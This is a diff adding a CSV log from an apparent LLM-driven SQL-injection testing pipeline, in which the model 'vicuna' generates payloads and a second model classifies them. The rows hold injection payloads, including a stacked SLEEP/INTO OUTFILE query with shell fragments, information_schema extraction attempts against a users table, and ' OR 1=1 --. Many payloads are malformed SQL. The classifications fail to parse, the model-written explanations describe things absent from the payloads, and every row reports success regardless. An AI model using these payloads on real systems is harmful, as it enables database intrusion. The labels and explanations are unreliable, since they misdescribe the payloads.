@@ -1,0 +1,219 @@
+timestamp,model,raw_payloads,single_payload,classification,reasoning,test_result,generator_time,discriminator_time
+2025-08-05 19:03:26,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload attempts to write a file '/tmp/a' using the OUTFILE statement combined wtih base64 encoding, potentially bypassing authentication mechanisms.” }
+
+
+ ```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,22.43
+2025-08-05 19:03:49,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload attempts to retrieve the count of all users by exploiting a vulnerability in username authentication using wildcard ‘%’ followed immediately after admin, then it uses CONCAT function with complex string manipulation involving substring and version() functions from information_schema.databases table.” 
+}
+
+```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,22.42
+2025-08-05 19:04:04,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')",ParseError,"```json
+
+{
+""classification"": ""LoginBypass"",
+""reasoning"":""The payload uses string concatenation to inject part of the password value from a hardcoded reference along  with information extracted via `version()` function call on table metadata, suggesting an attempt bypass login authentication without providing correct credentials.""",Success(S): Payload successfully showed Error-based SQL injection.,150.44,15.38
+2025-08-05 19:04:17,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')",ParseError,"```json
+
+{
+""classification"": ""LoginBypass"",
+""reasoning"":""The payload uses string concatenation to inject code that retrieves the current username from system information via `user()` function, demonstrating a classic login bypass technique.""",Success(S): Payload successfully showed Error-based SQL injection.,150.44,12.85
+2025-08-05 19:04:28,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload uses string concatenation to inject user credentials from the information schema table names.” }
+
+
+ ```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,11.12
+2025-08-05 19:04:45,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2",ParseError,"```json
+
+{
+""classification"": ""Login bypass"",
+""reasoning"":""The payload uses a UNION ALL attack to retrieve the count of users where username is 'admin%' along  with part if password from an encoded string, suggesting login bypassing attempt.""",Success(S): Payload successfully showed Error-based SQL injection.,150.44,17.31
+2025-08-05 19:05:02,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload attempts to retrieve the version of MySQL by exploiting a known vulnerability in information schema events, allowing for potential privilege escalation.” }
+
+
+ ```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,16.33
+2025-08-05 19:05:24,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload attempts to retrieve the username of an administrator by concatenating parts from a hardcoded string, user-schema information retrieved through INFORMATION_SCHEMA metadata (user_schema()), and additional characters. This suggests that it aims for login bypassing rather than data exfiltration or timing attacks."" }
+
+```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,22.65
+2025-08-05 19:05:39,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload attempts to retrieve the table name using ‘table_name()’ function from information schema, suggesting a login bypassing vulnerability rather than an error or time-based injection."" } 
+
+
+ ```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,14.93
+2025-08-05 19:05:52,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END","-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')",ParseError,"```json
+
+{ ""classification"":  ""Login bypass"",   “reasoning”: “The payload uses string concatenation to inject part of a value from an information schema function into the password field, potentially bypassing authentication.” }
+
+
+ ```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,12.75
+2025-08-05 19:06:05,vicuna,"Start
+
+-- UNION SELECT NULL;SELECT SLEEP(3) INTO OUTFILE '/tmp/a'-- -e 'bash';-p /bin/*;/dev/** /* */.-x %H%h.txt bASENAME('/etc', '$');select*from information_schema.* -- 8' OR length(@_) >0
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.databases)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select version()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select group_concat()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3) union all 'a'-- -e '' 08' OR SLEEP(65)>>-2
+-- select count(*) from users where username='admin%' and password=concat('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',char((select version()from information_schema.events)),'ccc') 8''
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select user_schema()from information_schema.users)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select table_name()from information_schema.tables)),'ccc')
+-- select count(*) from users where username='admin%' and password=concat(substring('aaaabbbbccccdeeffgghhiijjkkllmmnnoppqqqrrssttttuuvvwwxxyyz',1,3),char((select column_name()from information_schema.columns)),'ccc')
+
+...
+END",' OR 1=1 --,ParseError,"```json
+
+{
+""classification"": ""Login bypass"",
+""reasoning"":""The payload attempts to always evaluate true by exploiting the unconditional equality of '1' against itself using `OR` operator, effectively bypassing login authentication.""  }
+
+
+ ```",Success(S): Payload successfully showed Error-based SQL injection.,150.44,13.11
